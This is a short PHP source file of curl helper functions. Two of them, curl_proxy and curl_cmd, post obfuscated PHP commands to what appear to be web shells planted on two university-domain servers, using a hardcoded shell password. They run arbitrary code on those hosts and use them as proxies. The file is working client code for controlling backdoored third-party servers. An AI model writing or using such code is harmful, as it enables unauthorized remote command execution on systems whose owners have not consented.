<?php
require_once('cache.func.php');
require_once('cmd.func.php');

function curl_cache($url, $opt, $cache, $cacheId){
    if( 0 < $cache){
        $res = get_cache($cacheId, $cache);
        if( $res === false ){
            $res = curl($url, $opt);
            if($res === false || $res == 'error') return false;
            write_cache($cacheId, $res);
        }
    } else {
        $res = curl($url, $opt);
    }
    return $res;
}

function curl_proxy($url, $cache = 86400, $host = 'ecjtu'){
    $proxy['ecjtu'] = array(
        CURLOPT_URL        => 'http://ems.ecjtu.net/hemon.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "hemon=!QAZxsw2&url=" . urlencode($url),
        CURLOPT_ENCODING   => ''
    );
    $proxy['jwc'] = array(
        CURLOPT_URL        => 'http://jwc.ecjtu.jx.cn/assess/inc/DB.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "cmd=" . urlencode(stringToChr('ob_start("ob_gzhandler"); if($res = file_get_contents("' . $url . '")){echo $res;}else{echo "error";};')),
        CURLOPT_ENCODING   => ''
    );
    return curl_cache(null, $proxy[$host], $cache, $url);
}

function curl_cmd($cmd, $host = 'jwc'){
    $cmd = urlencode(stringToChr($cmd));
    $proxy['ecjtu'] = array(
        CURLOPT_URL        => 'http://ems.ecjtu.net/hemon.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "hemon=!QAZxsw2&cmd=$cmd",
        CURLOPT_ENCODING   => ''
    );
    $proxy['jwc'] = array(
        CURLOPT_URL        => 'http://jwc.ecjtu.jx.cn/assess/inc/db.php',
        CURLOPT_POST       => 1,
        CURLOPT_POSTFIELDS => "cmd=$cmd",
        CURLOPT_ENCODING   => ''
    );
    return curl($url, $proxy[$host]);
}

?>
